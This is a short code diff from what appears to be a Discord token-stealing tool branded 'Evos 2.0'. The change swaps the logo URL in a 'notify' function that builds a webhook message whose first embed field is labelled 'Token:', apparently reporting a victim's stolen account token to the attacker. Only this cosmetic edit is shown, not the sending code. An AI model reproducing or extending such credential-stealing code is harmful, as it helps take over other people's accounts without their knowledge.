@@ -259,7 +259,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.content = `-`;
     ctx.username = `Evos 2.0`;
-    ctx.avatar_url = `https://cdn.discordapp.com/attachments/794056531674398750/1281956282261045258/GWz-En_WAAARmpi.png?ex=671ce253&is=671b90d3&hm=62dbb154194f5b4d865856878d4a002e92c0bceb94604a4fe03dcfb56aecb98e&`;
+    ctx.avatar_url = `https://media.discordapp.net/attachments/1275103956338610259/1299683704473649243/EVOS_logo.png?ex=671ec106&is=671d6f86&hm=796cf41b9f36c4d128b0fc4ee25ba7cafae3824dc62943898ac22ae767a1af09&=&format=webp&quality=lossless`;
 
     ctx.embeds[0].fields.unshift({
         name: `Token:`,
